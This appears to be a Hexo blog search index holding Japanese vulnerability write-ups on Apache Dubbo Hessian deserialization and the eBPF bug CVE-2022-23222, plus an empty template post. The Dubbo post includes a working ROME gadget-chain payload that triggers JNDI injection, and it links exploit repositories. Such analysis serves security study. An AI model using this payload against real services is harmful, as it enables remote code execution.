<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Dubboデシリアライゼーション脆弱性分析</title>
      <link href="/2022/09/11/bin/java/Dubbo/"/>
      <url>/2022/09/11/bin/java/Dubbo/</url>
      
        <content type="html"><![CDATA[<h4 id="Dubboデシリアライゼーション脆弱性分析"><a href="#Dubboデシリアライゼーション脆弱性分析" class="headerlink" title="Dubboデシリアライゼーション脆弱性分析"></a>Dubboデシリアライゼーション脆弱性分析</h4><p>Apache Dubbo は高性能、軽量のオープンソース Java RPC フレームワークで、インターフェース指向のリモートメソッド呼び出し、インテリジェントな耐障害性と負荷分散、サービスの自動登録と検出という 3 つの中核機能を提供します。</p><p>Dubbo RPCは、Apache Dubboシステムの中核をなす、高性能・高スループットのリモート呼び出し方式で、主に2つのDubboシステム間のリモート呼び出しを行う。 Dubbo RPCでは、dubboシリアライズ、hesian2シリアライズ、kryoシリアライズ、jsonシリアライズ、javaシリアライズなど、さまざまなシリアライズ方式がサポートされています。</p><p>公式推奨のデフォルトのダボプロトコル</p><p>アーキテクチャは主に以下の通りです。</p><p><img src="/../../../img/bin/java/dubbo/01.png" alt="avatar"></p><table><thead><tr><th>ノード</th><th>役割の説明</th></tr></thead><tbody><tr><td>プロバイダ</td><td>サービスを公開するサービスプロバイダ</td></tr><tr><td>消費者</td><td>リモートサービスを呼び出すサービス消費者</td></tr><tr><td>レジストリ</td><td>サービスの登録と発見を行う登録センター</td></tr><tr><td>モニター</td><td>サービスの起動回数と起動時間をカウントする監視センター</td></tr><tr><td>コンテナ</td><td>サービス実行中のコンテナ</td></tr></tbody></table><p>通話関係の説明</p><ul><li>サービスコンテナは、サービスプロバイダの起動、ロード、実行を担当する。</li><li>サービスプロバイダは、提供するサービスを起動時にレジストリに登録する。</li><li>サービス消費者は、起動時に必要とするサービスのレジストリを購読する。</li><li>レジストリは、サービスプロバイダのアドレス一覧をコンシューマに返し、変更があれば、長い接続に基づいて、変更後のデータをコンシューマにプッシュする。</li><li>サービス利用者は、プロバイダアドレスのリストから、ソフトロードバランシングアルゴリズムに基づいて呼び出すプロバイダを選択し、呼び出しに失敗した場合は、別のプロバイダを選択して呼び出すことができます。</li><li>サービス利用者とプロバイダーは、呼び出し回数と呼び出し時間をメモリに蓄積し、1分間隔で監視センターに統計情報を送信</li></ul><h5 id="環境設定"><a href="#環境設定" class="headerlink" title="環境設定"></a>環境設定</h5><p>公式ケースを直接使用する</p><p><a href="https://github.com/apache/dubbo-samples">https://github.com/apache/dubbo-samples</a></p><p>httpの例があります。</p><p>Dubboサービスを利用するには、レジストリのzookeeperが必要です</p><p><a href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p><p>インターフェース</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.dubbo.samples.http.api;</span><br><span class="line"></span><br><span class="line">public interface DemoService &#123;</span><br><span class="line">    String sayHello(String name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>実装クラス</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class DemoServiceImpl implements DemoService &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String sayHello(String name) &#123;</span><br><span class="line">        System.out.println(&quot;[&quot; + new SimpleDateFormat(&quot;HH:mm:ss&quot;).format(new Date()) + &quot;] Hello &quot; + name +</span><br><span class="line">                &quot;, request from consumer: &quot; + RpcContext.getContext().getRemoteAddress());</span><br><span class="line">        return &quot;Hello &quot; + name + &quot;, response from provider: &quot; + RpcContext.getContext().getLocalAddress();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>サービスプロバイダー</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class HttpProvider &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;spring/http-provider.xml&quot;);</span><br><span class="line">        context.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;dubbo service started&quot;);</span><br><span class="line">        new CountDownLatch(1).await();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>コンシューマーズ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class HttpConsumer &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;spring/http-consumer.xml&quot;);</span><br><span class="line">        context.start();</span><br><span class="line"></span><br><span class="line">        DemoService demoService = (DemoService) context.getBean(&quot;demoService&quot;);</span><br><span class="line">        String result = demoService.sayHello(&quot;world&quot;);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ここでも、リソースディレクトリにプロバイダーとサービサーのコンフィギュレーションを設定する必要があります</p><p>http-provider.xml ：インターフェースと実装クラスの設定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:dubbo=&quot;http://dubbo.apache.org/schema/dubbo&quot;</span><br><span class="line">       xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://dubbo.apache.org/schema/dubbo http://dubbo.apache.org/schema/dubbo/dubbo.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;</span><br><span class="line">    &lt;context:property-placeholder/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dubbo:application name=&quot;http-provider&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dubbo:registry address=&quot;zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dubbo:protocol name=&quot;http&quot; id=&quot;http&quot; port=&quot;$&#123;servlet.port:8080&#125;&quot; server=&quot;$&#123;servlet.container:tomcat&#125;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=&quot;demoService&quot; class=&quot;org.apache.dubbo.samples.http.impl.DemoServiceImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dubbo:service interface=&quot;org.apache.dubbo.samples.http.api.DemoService&quot; ref=&quot;demoService&quot; protocol=&quot;http&quot;/&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>http-consumer.xml：アクセスするインターフェースを設定する。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:dubbo=&quot;http://dubbo.apache.org/schema/dubbo&quot;</span><br><span class="line">       xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://dubbo.apache.org/schema/dubbo http://dubbo.apache.org/schema/dubbo/dubbo.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;</span><br><span class="line">    &lt;context:property-placeholder/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dubbo:application name=&quot;http-consumer&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dubbo:registry address=&quot;zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dubbo:reference id=&quot;demoService&quot; interface=&quot;org.apache.dubbo.samples.http.api.DemoService&quot;/&gt;</span><br><span class="line">&lt;/beans&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最後にzookeeperプロバイダ、consumerを起動します。</p><h5 id="デシリアライズの脆弱性"><a href="#デシリアライズの脆弱性" class="headerlink" title="デシリアライズの脆弱性"></a>デシリアライズの脆弱性</h5><h6 id="Hessian协议-lt-x3D-2-7-6"><a href="#Hessian协议-lt-x3D-2-7-6" class="headerlink" title="Hessian协议&lt;&#x3D; 2.7.6"></a>Hessian协议&lt;&#x3D; 2.7.6</h6><p>影響範囲<br>2.7.0 &lt;&#x3D; Dubbo Version &lt;&#x3D; 2.7.6<br>2.6.0 &lt;&#x3D; Dubbo Version &lt;&#x3D; 2.6.7<br>Dubbo 全バージョン 2.5.x (現在、公式チームによるサポートはありません)</p><p>環境<br>ここでの主な脆弱性は、hessianプロトコルによるdubboのデフォルトのデシリアライゼーションによるもので、私は公式の例を環境として参照します。</p><p><a href="https://github.com/apache/dubbo-spring-boot-project">https://github.com/apache/dubbo-spring-boot-project</a></p><p>脆弱性バージョン2.7.5をダウンロードし、pom.xmlファイルのクローンや修正も行います。</p><p><img src="/../../../img/bin/java/dubbo/02.png" alt="avatar"></p><p>サービスプロバイダーとして、プロバイダーサンプルの一つを使用しています</p><p>まずpom.xmlの条件付き利用依存関係では、多くの利用チェーンがあり、どのような依存関係に応じてどのようなチェーンを再生するためにあるSpringPartiallyComparableAdvisorHolder SpringAbstractBeanFactoryPointcutAdvisorローマROME + CCなどです。Groovy、その他多くの活用の連鎖</p><p>ここでは、JNDIインジェクションを打つRomeと、ネットから出ないROME+CCの例を見てみましょう。</p><p>まず、ROME依存とCC依存を追加します。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.rometools&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.7.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>JNDIインジェクションはJDKの上位バージョンでは制限されているため、もちろん上位バージョンのバイパスメソッドも存在しますが、ここでは便宜上、プロパティ値をtrueに設定することにします</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br></pre></td></tr></table></figure><p>次に、コムスマー環境を設定する</p><p>ROME チェーンを形成する getPayload メソッドを条件とする。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private static Object getPayload() throws Exception &#123;</span><br><span class="line">    //反序列化时ToStringBean.toString()会被调用，触发JdbcRowSetImpl.getDatabaseMetaData-&gt;JdbcRowSetImpl.connect-&gt;Context.lookup</span><br><span class="line">    String jndiUrl = &quot;ldap://127.0.0.1:1389/xitdbc&quot;;</span><br><span class="line">    JdbcRowSetImpl rs = new JdbcRowSetImpl();</span><br><span class="line">    rs.setDataSourceName(jndiUrl);</span><br><span class="line">    rs.setMatchColumn(&quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">//反序列化时EqualsBean.beanHashCode会被调用，触发ToStringBean.toString</span><br><span class="line">    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);</span><br><span class="line"></span><br><span class="line">//反序列化时HashMap.hash会被调用，触发EqualsBean.hashCode-&gt;EqualsBean.beanHashCode</span><br><span class="line">    EqualsBean root = new EqualsBean(ToStringBean.class, item);</span><br><span class="line"></span><br><span class="line">//HashMap.put-&gt;HashMap.putVal-&gt;HashMap.hash</span><br><span class="line">    HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();</span><br><span class="line">    setFieldValue(s, &quot;size&quot;, 2);</span><br><span class="line">    Class&lt;?&gt; nodeC;</span><br><span class="line">    try &#123;</span><br><span class="line">        nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    catch ( ClassNotFoundException e ) &#123;</span><br><span class="line">        nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">    nodeCons.setAccessible(true);</span><br><span class="line"></span><br><span class="line">    Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">    Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));</span><br><span class="line">    Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));</span><br><span class="line">    setFieldValue(s, &quot;table&quot;, tbl);</span><br><span class="line"></span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>このデータは、メソッドが呼び出されたときに渡されます。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@Bean</span><br><span class="line">public ApplicationRunner runner() throws Exception&#123;</span><br><span class="line">    Object o = getPayload();</span><br><span class="line">    //return args -&gt; logger.info(demoService.sayHello(&quot;mercyblitz&quot;));</span><br><span class="line">    return args -&gt; logger.info(demoService.commonTest(o));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析<br>さて、環境が整ったので、デバッグしてプロバイダを実行してみましょう</p><p>を実行し、コンシューマの例を実行します。</p><p>コールスタックを最初に与え、その詳細を分析する。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">toString:158, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:129, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:180, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2080, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">received:44, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最初はすべてメソッドトリガーの呼び出しで、その後DecodeHandler#receivedメソッドでデコードメソッドを呼び出し、デコード処理を開始します</p><p><a href="https://github.com/NafisiAslH/KnowledgeSharing/tree/main/CyberSecurity/Web/CVEs/CVE-2022/CVE-2022-30190">https://github.com/NafisiAslH/KnowledgeSharing/tree/main/CyberSecurity/Web/CVEs/CVE-2022/CVE-2022-30190</a><br><a href="https://github.com/klezVirus/CVE-2021-40444/">https://github.com/klezVirus/CVE-2021-40444/</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> Dubbo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bin </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2022-1786</title>
      <link href="/2022/09/08/bin/linux/cve-2022-2639/"/>
      <url>/2022/09/08/bin/linux/cve-2022-2639/</url>
      
        <content type="html"><![CDATA[<h4 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h4><h5 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog.kylebot.net/2022/10/16/CVE-2022-1786/">https://blog.kylebot.net/2022/10/16/CVE-2022-1786/</a></p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> afl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2022-23222</title>
      <link href="/2022/09/08/bin/linux/cve-2022-23222/"/>
      <url>/2022/09/08/bin/linux/cve-2022-23222/</url>
      
        <content type="html"><![CDATA[<h4 id="CVE-2022-23222-脆弱性及び悪用可能性の解析"><a href="#CVE-2022-23222-脆弱性及び悪用可能性の解析" class="headerlink" title="CVE-2022-23222 脆弱性及び悪用可能性の解析"></a>CVE-2022-23222 脆弱性及び悪用可能性の解析</h4><h5 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h5><p>2022年1月14日、CVE-2022-23222と番号付けされた脆弱性が公開されました。これは、eBPFバリデータに存在する脆弱性で、eBPFプログラムが検証なしに特定のポインターに対して操作を行い、慎重に構築したコードによって任意のカーネルメモリの読み取りと書き込みが可能になり、ローカルラプチャの危険性を生じさせるというものです。</p><h5 id="0x01-ハザード"><a href="#0x01-ハザード" class="headerlink" title="0x01 ハザード"></a>0x01 ハザード</h5><p>脆弱性Pocの公開により、この脆弱性を悪用するコストは限りなく0に近づきましたが、脆弱性を悪用するのは簡単ではなく、ローカルで非特権ユーザーにBPFプログラムの実行を許可する必要がありますが、ほとんどのディストリビューションではデフォルトで禁止されています。 また、この脆弱性はカーネルバージョン5.8.0で導入されたものであり、多くの実稼働環境ではこのような高いカーネルバージョンを使用していないため、この問題はあまり深刻ではないと考えられます。</p><h5 id="0x02-脆弱性の原理"><a href="#0x02-脆弱性の原理" class="headerlink" title="0x02 脆弱性の原理"></a>0x02 脆弱性の原理</h5><p>eBPF プログラムを書く際には、 bpf_map_lookup_elem() が返す結果が NULL であるかどうかを判断することが重要です。 これは、bpf_map_lookup_elem() の実行結果が NULL である可能性があり、これはキーに関連する値が検索されなかったことを示す状況であるためです。 もし判定が行われないと、この後のコードでヌルポインタを参照する可能性があり、非常に危険な操作となります。<br>では、結果が NULL かどうかを判断したとき、バリデータはどのようにしてそれを知るのでしょうか? 関連する実装コードを見てみましょう。</p><p>bpf.h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">/* types of values stored in eBPF registers */</span><br><span class="line">/* Pointer types represent:</span><br><span class="line"> * pointer</span><br><span class="line"> * pointer + imm</span><br><span class="line"> * pointer + (u16) var</span><br><span class="line"> * pointer + (u16) var + imm</span><br><span class="line"> * if (range &gt; 0) then [ptr, ptr + range - off) is safe to access</span><br><span class="line"> * if (id &gt; 0) means that some &#x27;var&#x27; was added</span><br><span class="line"> * if (off &gt; 0) means that &#x27;imm&#x27; was added</span><br><span class="line"> */</span><br><span class="line">enum bpf_reg_type &#123;</span><br><span class="line">    NOT_INIT = 0,         /* nothing was written into register */</span><br><span class="line">    SCALAR_VALUE,         /* reg doesn&#x27;t contain a valid pointer */</span><br><span class="line">    PTR_TO_CTX,           /* reg points to bpf_context */</span><br><span class="line">    CONST_PTR_TO_MAP,     /* reg points to struct bpf_map */</span><br><span class="line">    PTR_TO_MAP_VALUE,     /* reg points to map element value */</span><br><span class="line">    PTR_TO_MAP_VALUE_OR_NULL,  /* points to map elem value or NULL */</span><br><span class="line">    PTR_TO_STACK,         /* reg == frame_pointer + offset */</span><br><span class="line">    PTR_TO_PACKET_META,   /* skb-&gt;data - meta_len */</span><br><span class="line">    PTR_TO_PACKET,        /* reg points to skb-&gt;data */</span><br><span class="line">    PTR_TO_PACKET_END,    /* skb-&gt;data + headlen */</span><br><span class="line">    PTR_TO_FLOW_KEYS,     /* reg points to bpf_flow_keys */</span><br><span class="line">    PTR_TO_SOCKET,        /* reg points to struct bpf_sock */</span><br><span class="line">    PTR_TO_SOCKET_OR_NULL,      /* reg points to struct bpf_sock or NULL */</span><br><span class="line">    PTR_TO_SOCK_COMMON,   /* reg points to sock_common */</span><br><span class="line">    PTR_TO_SOCK_COMMON_OR_NULL, /* reg points to sock_common or NULL */</span><br><span class="line">    PTR_TO_TCP_SOCK,      /* reg points to struct tcp_sock */</span><br><span class="line">    PTR_TO_TCP_SOCK_OR_NULL,    /* reg points to struct tcp_sock or NULL */</span><br><span class="line">    PTR_TO_TP_BUFFER,     /* reg points to a writable raw tp&#x27;s buffer */</span><br><span class="line">    PTR_TO_XDP_SOCK,      /* reg points to struct xdp_sock */</span><br><span class="line">    /* PTR_TO_BTF_ID points to a kernel struct that does not need</span><br><span class="line">     * to be null checked by the BPF program. This does not imply the</span><br><span class="line">     * pointer is _not_ null and in practice this can easily be a null</span><br><span class="line">     * pointer when reading pointer chains. The assumption is program</span><br><span class="line">     * context will handle null pointer dereference typically via fault</span><br><span class="line">     * handling. The verifier must keep this in mind and can make no</span><br><span class="line">     * assumptions about null or non-null when doing branch analysis.</span><br><span class="line">     * Further, when passed into helpers the helpers can not, without</span><br><span class="line">     * additional context, assume the value is non-null.</span><br><span class="line">     */</span><br><span class="line">    PTR_TO_BTF_ID,</span><br><span class="line">    /* PTR_TO_BTF_ID_OR_NULL points to a kernel struct that has not</span><br><span class="line">     * been checked for null. Used primarily to inform the verifier</span><br><span class="line">     * an explicit null check is required for this struct.</span><br><span class="line">     */</span><br><span class="line">    PTR_TO_BTF_ID_OR_NULL,</span><br><span class="line">    PTR_TO_MEM,           /* reg points to valid memory region */</span><br><span class="line">    PTR_TO_MEM_OR_NULL,   /* reg points to valid memory region or NULL */</span><br><span class="line">    PTR_TO_RDONLY_BUF,    /* reg points to a readonly buffer */</span><br><span class="line">    PTR_TO_RDONLY_BUF_OR_NULL,  /* reg points to a readonly buffer or NULL */</span><br><span class="line">    PTR_TO_RDWR_BUF,      /* reg points to a read/write buffer */</span><br><span class="line">    PTR_TO_RDWR_BUF_OR_NULL,    /* reg points to a read/write buffer or NULL */</span><br><span class="line">    PTR_TO_PERCPU_BTF_ID,       /* reg points to a percpu kernel variable */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>このコードでは、NULLでないポインタ型を型 “<em>_OR_NULL “で表現していることがわかる。 レジスタが “</em>_OR_NULL “タイプである場合、非常に限られた数の操作しか実行できない。 型 “<em><em>OR_NULL “のレジスタがNULL比較を行った後でのみ、型 “PTR_TO</em></em>“の通常のポインタに変更することが可能です。</p><p>脆弱性のあるコードは linux&#x2F;kernel&#x2F;bpf&#x2F;verifier.c にあります。<br>欠陥のある部分は以下の通りです。</p><figure class="highlight plaintext"><table><tr><td 